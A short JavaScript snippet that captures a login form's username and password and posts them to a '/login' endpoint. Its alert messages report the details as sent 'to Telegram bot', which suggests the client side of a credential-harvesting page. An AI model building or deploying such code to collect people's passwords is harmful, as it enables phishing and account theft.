document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent the form from submitting
    
    // Get the username and password from the form
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    
    // Make an AJAX request to the server-side endpoint
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/login", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                alert("Login details sent to Telegram bot successfully!");
            } else {
                alert("Failed to send login details to Telegram bot.");
            }
        }
    };
    xhr.send(JSON.stringify({username: username, password: password}));
});
